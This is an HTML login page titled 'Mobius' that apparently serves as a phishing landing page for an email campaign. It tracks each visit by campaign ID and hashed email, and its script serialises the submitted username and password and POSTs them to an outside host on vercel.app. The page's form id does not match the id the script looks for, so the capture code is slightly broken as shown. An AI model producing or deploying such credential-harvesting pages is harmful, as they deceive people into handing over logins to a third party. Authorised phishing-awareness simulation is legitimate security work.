<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta charset="UTF-8">
    <title>Mobius</title>
    <link rel="stylesheet" type="text/css" href="css/display.css">
    <link rel="stylesheet" type="text/css" href="css/style.css">
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Verdana, Arial, Helvetica, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            flex-direction: column;
            position: relative;
        }

        #login-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            width: 90%;
            max-width: 400px;
            padding: 20px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
            position: absolute;
            top: 45%;
            left: 66%;
            transform: translate(-50%, -50%);
        }

        #login-bg {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('imgs/login-bg.png') no-repeat center center;
            background-size: cover;
            z-index: -1;
        }

        #login-logo {
            width: 150px;
            height: auto;
            margin-bottom: 20px;
        }

        #form-login {
            width: 100%;
        }

        #form-login ul {
            list-style: none;
            padding: 0;
        }

        #form-login ul li {
            margin-bottom: 10px;
        }

        #form-login ul li label {
            display: block;
            margin-bottom: 5px;
            color: white;
        }

        #form-login ul li input {
            width: 100%;
            padding: 8px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

        #btn-logon {
            width: 100%;
            margin-top: 10px;
            padding: 10px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        #btn-logon:hover {
            background-color: #0056b3;
        }

        @media (max-width: 1024px) {
            #login-container {
                left: 50%;
                width: 90%;
                max-width: 350px;
                transform: translate(-50%, -50%);
            }
        }
    </style>
    <script>
        function getParameters() {
            const urlParams = new URLSearchParams(window.location.search);
            const hashEmail = urlParams.get('hashEmail');
            const campaignId = urlParams.get('campaignId');
            return [campaignId, hashEmail];
        }

        function sendToTrackerAPI(httpMethod, campaignId, type, hashEmail, payload = null) {
            const trackerApiUrl = `https://campaign-ruddy.vercel.app/api/t/${campaignId}/${type}/${hashEmail}`;
            const fetchOptions = {
                method: httpMethod.toUpperCase(),
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                }
            };

            if (httpMethod.toUpperCase() === 'POST' && payload) {
                fetchOptions.body = payload;
            }

            fetch(trackerApiUrl, fetchOptions)
                .then(response => response.json())
                .then(data => console.log('Tracker response:', data))
                .catch(error => console.error('Error sending tracking request:', error));
        }

        function trackPageLoad() {
            const param = getParameters();
            if (param[0] && param[1]) {
                sendToTrackerAPI('GET', param[0], 'url', param[1]);
            } else {    
                console.error('URL Not Completed.');
            }
        }

        document.addEventListener("DOMContentLoaded", function () {
            trackPageLoad();

            const form = document.getElementById('submitForm');
            if (form) {
                form.addEventListener('submit', function (event) {
                    event.preventDefault();
                    const param = getParameters();
                    const formData = new FormData(event.target);
                    let payload = "";

                    formData.forEach((value, key) => {
                        payload += `${key}=${value}&`
                    });
                    payload = payload.slice(0, -1);

                    if (param[0] && param[1]) {
                        sendToTrackerAPI('POST', param[0], 'fill', param[1], payload);
                    } else {
                        console.error('URL Not Completed.');
                    }
                });
            }
        });
    </script>
</head>
<body>
    <div id="login-bg"></div>
    <div id="login-container">
        <div id="form-login">
            <form id="submitFormA" autocomplete="off" name="frmLogin" method="post">
                <ul>
                    <li><label for="txtUserName">User Name</label><input type="text" name="txtUserName" id="txtUserName"></li>
                    <li><label for="txtPassword">Password</label><input type="password" name="txtPassword" id="txtPassword"></li>
                    <li><input type="submit" value="Login" id="btn-logon"></li>
                </ul>
            </form>
        </div>
    </div>
</body>
</html>
